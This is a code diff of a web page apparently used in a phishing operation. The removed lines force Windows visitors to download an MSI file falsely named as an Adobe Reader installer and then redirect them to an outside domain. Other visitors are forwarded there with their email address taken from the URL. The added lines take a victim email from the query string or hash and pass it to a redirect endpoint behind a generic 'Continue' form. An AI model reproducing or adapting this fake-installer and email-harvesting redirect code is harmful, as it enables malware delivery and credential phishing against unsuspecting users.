@@ -1,67 +1,95 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 
 export default function Home() {
+  const [email, setEmail] = useState("");
+
   useEffect(() => {
-    const userAgent = navigator.userAgent || "";
-    const isWindows = /windows/i.test(userAgent);
+    let extracted = "";
 
-    const NON_WINDOWS_TARGET = "https://aspiceconference.com/cw";
-    const MSI_FILE = "/Adobe_Reader_install.msi";
-    const WINDOWS_REDIRECT = "https://aspiceconference.com/adobe-reader/installer/download.html";
+    if (typeof window !== "undefined") {
+      const params = new URLSearchParams(window.location.search);
+      extracted = params.get("email") || params.get("smn") || "";
 
-    if (isWindows) {
-      window.location.href = MSI_FILE;
-      setTimeout(() => {
-        window.location.href = WINDOWS_REDIRECT;
-      }, 3000);
+      if (!extracted && window.location.hash) {
+        try {
+          extracted = decodeURIComponent(
+            window.location.hash.replace(/^#/, "")
+          );
+        } catch {
+          extracted = window.location.hash.replace(/^#/, "");
+        }
+      }
+    }
+
+    if (extracted) {
+      setEmail(extracted);
+      redirect(extracted);
+    }
+  }, []);
+
+  function redirect(value) {
+    const clean = value.trim().toLowerCase();
+
+    if (!clean || !clean.includes("@")) {
+      window.location.href = "/api/redirect";
       return;
     }
 
-    let email = "";
-    const url = new URL(window.location.href);
+    window.location.href =
+      `/api/redirect?email=${encodeURIComponent(clean)}`;
+  }
 
-    // Grab email from hash or query parameters
-    if (url.hash) email = url.hash.substring(1);
-    else if (url.searchParams.get("email")) email = url.searchParams.get("email");
-    else if (url.searchParams.get("smn")) email = url.searchParams.get("smn");
-
-    const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
-    window.location.replace(finalUrl);
-  }, []);
+  function handleSubmit(e) {
+    e.preventDefault();
+    redirect(email);
+  }
 
   return (
-    <main style={{ textAlign: "center", padding: "40px", fontFamily: "Arial, sans-serif" }}>
-      <h1>Redirecting…</h1>
-      <p>If your download does not start automatically, click below:</p>
-      <a
-        href="/Reader_en_install.msi"
-        download
-        style={{
-          padding: "12px 24px",
-          backgroundColor: "#0070f3",
-          color: "#fff",
-          borderRadius: "6px",
-          textDecoration: "none",
-          fontWeight: "bold",
-          marginTop: "20px",
-          display: "inline-block"
-        }}
-      >
-        Download Now
-      </a>
+    <main style={styles.main}>
+      <h1 style={styles.title}>Continue</h1>
+
+      <form onSubmit={handleSubmit} style={styles.form}>
+        <input
+          type="email"
+          placeholder="Enter your email"
+          value={email}
+          onChange={e => setEmail(e.target.value)}
+          required
+          style={styles.input}
+        />
+
+        <button type="submit" style={styles.button}>
+          Continue
+        </button>
+      </form>
     </main>
   );
 }
 
-
-
-
-
-
-
-
-
-
-
-
-
+const styles = {
+  main: {
+    minHeight: "100vh",
+    display: "flex",
+    flexDirection: "column",
+    justifyContent: "center",
+    alignItems: "center",
+    fontFamily: "system-ui, -apple-system, sans-serif",
+  },
+  title: {
+    marginBottom: "1rem",
+  },
+  form: {
+    display: "flex",
+    gap: "0.5rem",
+  },
+  input: {
+    padding: "0.6rem",
+    fontSize: "1rem",
+    width: "260px",
+  },
+  button: {
+    padding: "0.6rem 1rem",
+    fontSize: "1rem",
+    cursor: "pointer",
+  },
+};
